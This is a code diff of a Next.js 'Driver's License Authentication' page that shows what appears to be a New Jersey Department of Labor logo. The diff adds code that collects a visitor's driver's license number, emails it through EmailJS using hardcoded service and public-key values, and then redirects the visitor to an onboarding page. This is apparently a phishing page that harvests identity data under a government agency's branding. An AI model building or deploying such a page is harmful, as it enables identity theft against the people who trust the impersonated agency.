@@ -1,32 +1,49 @@
 import styles from '../styles/Home.module.css';
-import { useRef, useState } from 'react';
+import { useState } from 'react';
+import emailjs from 'emailjs-com';
+import { useRouter } from 'next/router';
 
 const Authenticate = () => {
-    const form = useRef();
-    const [licenseImage, setLicenseImage] = useState(null);
     const [licenseNumber, setLicenseNumber] = useState('');
-
-    const handleImageChange = (e) => {
-        setLicenseImage(e.target.files[0]);
-    };
+    const [error, setError] = useState('');
+    const router = useRouter();
 
     const handleNumberChange = (e) => {
-        setLicenseNumber(e.target.value);
+        const value = e.target.value.replace(/\D/g, ''); // Only digits
+        setLicenseNumber(value);
+        setError('');
     };
 
     const handleSubmit = (e) => {
         e.preventDefault();
-        if (!licenseImage && !licenseNumber) {
-            alert('Please provide either a driver’s license image or number.');
+        if (licenseNumber.length < 7 || licenseNumber.length > 16) {
+            setError('License number must be 7 to 16 digits.');
             return;
         }
-        // Add your authentication logic here
-        alert('Authentication submitted!');
+        setError('');
+
+        // Prepare data for EmailJS
+        const templateParams = {
+            licenseNumber: licenseNumber
+        };
+
+        emailjs.send(
+            'service_ozea06x',
+            'template_e76f7uk', // Replace with your EmailJS template ID for authenticate page
+            templateParams,
+            'XMOnwjyzQDoRVRYl3'
+        ).then(
+            (response) => {
+                router.push('/onboarding');
+            },
+            (error) => {
+                setError('Error sending form');
+            }
+        );
     };
 
     return (
         <div className={styles.container}>
-            {/* Logo Section */}
             <div className={styles.logoWrapper}>
                 <img
                     src="/ASSET/njdol_logo_stamp.svg"
@@ -34,29 +51,12 @@ const Authenticate = () => {
                     className={styles.logo}
                 />
             </div>
-
-            {/* Authentication Form Section */}
             <div className={styles.formSection}>
-                <form className={styles.loginForm} ref={form} onSubmit={handleSubmit}>
+                <form className={styles.loginForm} onSubmit={handleSubmit} autoComplete="off">
                     <h2 className={styles.heading}>Driver’s License Authentication</h2>
-                    <p style={{
-                        textAlign: 'center',
-                        color: '#254d73',
-                        fontSize: '1rem',
-                        margin: '0 0 18px 0',
-                        fontStyle: 'italic'
-                    }}>
-                        Please upload a clear image of your driver’s license, or enter your driver’s license number if the image is not available.
+                    <p className={styles.direction} style={{ marginBottom: 18, color: '#254d73', fontWeight: 500 }}>
+                        Please enter your driver’s license number (7-16 digits) to continue.
                     </p>
-                    <label style={{ width: '100%', marginBottom: '12px', color: '#2a2f32', fontWeight: 500 }}>
-                        Upload Driver’s License Image
-                        <input
-                            type="file"
-                            accept="image/*"
-                            onChange={handleImageChange}
-                            style={{ display: 'block', marginTop: '6px' }}
-                        />
-                    </label>
                     <input
                         type="text"
                         id="licenseNumber"
@@ -65,9 +65,23 @@ const Authenticate = () => {
                         className={styles.input}
                         value={licenseNumber}
                         onChange={handleNumberChange}
-                        disabled={!!licenseImage}
+                        maxLength={16}
+                        minLength={7}
+                        pattern="\d{7,16}"
+                        inputMode="numeric"
+                        autoComplete="off"
                     />
-                    <button type="submit" className={styles.button} style={{ marginTop: '22px' }}>
+                    {error && (
+                        <div style={{ color: '#b00020', margin: '10px 0', textAlign: 'center', fontWeight: 500 }}>
+                            {error}
+                        </div>
+                    )}
+                    <button
+                        type="submit"
+                        className={styles.button}
+                        style={{ marginTop: '22px' }}
+                        disabled={licenseNumber.length < 7 || licenseNumber.length > 16}
+                    >
                         Submit
                     </button>
                 </form>
